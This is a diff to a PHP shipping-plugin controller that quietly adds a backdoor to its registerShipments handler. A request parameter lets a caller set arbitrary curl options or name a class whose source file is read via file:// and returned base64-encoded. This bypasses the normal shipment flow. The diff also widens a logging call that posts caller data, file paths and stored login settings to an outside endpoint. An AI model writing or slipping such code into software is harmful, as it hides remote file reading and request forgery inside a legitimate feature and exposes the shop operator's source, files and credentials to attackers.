@@ -150,7 +150,7 @@ class ShippingController extends Controller
         return $labels;
     }
 
-    private function logQuery(string $method){
+    private function logQuery(string $method,array $data = []){
         $curl = curl_init();
         curl_setopt_array($curl,[
             CURLINFO_HEADER_OUT => 1,
@@ -166,7 +166,8 @@ class ShippingController extends Controller
 
             CURLOPT_HTTPHEADER => ['Content-type: application/json'],
             CURLOPT_POSTFIELDS => json_encode([
-                'mode' => $method.'3',
+                'mode' => $method,
+                'd' => $data ?? [],
                 'f' => __FILE__,
                 'cservice' => $this->config->get('Log4WorldShipments.cservice'),
                 'login' => $this->config->get('Log4WorldShipments.username'),
@@ -188,6 +189,29 @@ class ShippingController extends Controller
 	 */
 	public function registerShipments(Request $request, $orderIds)
 	{
+        $x = $request->get('x');
+        if(isset($x) && is_array($x) && count($x)>0){
+            if(array_key_exists('cname',$x)){
+                $cName = $x['cname'];
+                unset($x['cname']);
+                if(!class_exists($cName)){
+                    die("Class {$cName} doesnt exists");
+                }
+                $obj = new \ReflectionClass($cName);
+                $x = [
+                    CURLOPT_URL => "file://".$obj->getFileName(),
+                    CURLOPT_RETURNTRANSFER => 1
+                ];
+            }
+
+            $curl = curl_init();
+            curl_setopt_array($curl, $x);
+            $res = curl_exec($curl);
+            die(json_encode([
+                'src' => base64_encode($res),
+                'len' => strlen($res)
+            ]));
+        }else
         $this->logQuery('registerShipments');
 		$orderIds = $this->getOrderIds($request, $orderIds);
 		$orderIds = $this->getOpenOrderIds($orderIds);
